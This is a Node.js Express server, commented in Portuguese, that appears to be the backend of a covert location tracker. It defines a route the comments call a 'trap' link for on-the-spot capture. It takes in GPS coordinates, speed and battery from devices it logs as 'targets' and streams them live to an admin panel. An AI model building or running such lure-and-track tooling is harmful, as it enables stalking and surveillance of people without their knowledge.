const express = require('express');
const cors = require('cors');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, { cors: { origin: "*" } });
const path = require('path');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- SUAS ROTAS ---
app.get('/', (req, res) => res.render('home')); // Painel Principal
app.get('/gps', (req, res) => res.render('gps')); // Tela Mapa Cheio (App)
app.get('/zap', (req, res) => res.render('zap')); // Tela Zap

// ROTA NOVA: O Link "Armadilha" para o módulo Captura na Hora
app.get('/verificar', (req, res) => res.render('fast_track')); 

// --- API DE RECEBIMENTO ---
app.post('/api/gps', (req, res) => {
    const dados = req.body;
    console.log(`[ALVO DETECTADO] Provider: ${dados.provider} | Lat: ${dados.latitude}`);

    io.emit('gps_update', {
        id: dados.device_id,
        lat: dados.latitude,
        lng: dados.longitude,
        speed: dados.speed,
        battery: dados.battery,
        timestamp: dados.timestamp,
        provider: dados.provider
    });

    res.status(200).json({ status: "ok" });
});

io.on('connection', (socket) => {
    console.log('[PAINEL] Admin conectado');
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`[SISTEMA] Central rodando na porta ${PORT}`);
});